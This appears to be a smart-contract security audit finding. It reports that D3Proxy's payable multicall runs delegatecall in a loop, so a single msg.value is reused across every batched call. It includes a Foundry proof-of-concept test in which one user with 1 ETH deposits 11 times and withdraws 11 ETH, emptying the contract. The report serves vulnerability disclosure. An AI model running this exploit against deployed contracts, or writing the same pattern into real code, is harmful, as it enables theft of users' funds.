# Unsafe Usage Of delegatecall in D3Proxy

## Summary

## Vulnerability Detail
The D3Proxy contract employs the delegatecall pattern, allowing user-provided calldata in a payable function within a loop. Consequently, each delegatecall in the loop retains the original msg.value of the transaction that triggered the multicall() function. During a delegatecall, both msg.sender and msg.value persist. This exposes a potential vulnerability where an attacker could batch multiple calls to contract functions, thereby reusing msg.value across every call.


## Impact
Exploit Scenario

An attacker could potentially exploit the userDeposit() function, which acquires tokens based on the msg.value. By leveraging the batching functionality, the attacker could inflate their ETH balance without genuinely transferring funds from their account. This malicious action allows them to illicitly siphon funds from the system. In a proof of concept (POC), we can gain a clearer understanding of this issue, demonstrating how a user with only 1 ETH can withdraw all available funds from the contract.

```solidity
   function testUserDepositBatch() public {

        vm.deal(address(d3Proxy),  10 ether);

            vm.prank(vaultOwner);
            d3Vault.addNewToken(
                address(weth), // token
                1000 * 1e18, // max deposit
                500 * 1e18, // max collateral
                90 * 1e16, // collateral weight: 90%
                110 * 1e16, // debtWeight: 110%
                10 * 1e16 // reserve factor: 10%
            );
            
            (address dToken,,,,,,,,,, uint256 bVaultReserve) = d3Vault.getAssetInfo(address(weth));
            
            vm.deal(user1, 1 ether);
            vm.prank(user1);
                    // construct swap bytes data
         SwapCallbackData memory swapData;
         swapData.data = "";
         swapData.payer = user1;
 
         bytes memory swapDataBytes = abi.encodeWithSignature(
             "userDeposit("
                "address,"
                "address,"
                "uint256,"
                "uint256"
                ")", 
             user1,
             _ETH_ADDRESS_, 
             1 ether, 
             1 ether
         );

       
         // construct multicall data so that we can deposit 10 times our initial balance the contract wont revert with not enough balance 
         bytes[] memory mulData = new bytes[](11);
         mulData[0] = swapDataBytes;
         mulData[1] = swapDataBytes;
          mulData[2] = swapDataBytes;
          mulData[3] = swapDataBytes;
          mulData[4] = swapDataBytes;
          mulData[5] = swapDataBytes;
          mulData[6] = swapDataBytes;
          mulData[7] = swapDataBytes;
          mulData[8] = swapDataBytes;
          mulData[9] = swapDataBytes;
          mulData[10] = swapDataBytes;
          
        d3Proxy.multicall{value: 1 ether}(mulData);
        vm.prank(user1);

        D3Token(dToken).approve(address(dodoApprove), type(uint256).max);
        vm.prank(user1);

        d3Proxy.userWithdraw(user1, _ETH_ADDRESS_, 11 ether, 11 ether);
        console.log("user balance after withdrawing:",user1.balance);
        console.log("contract balance:",address(d3Proxy).balance);//this will be 0
      
    }
  ```
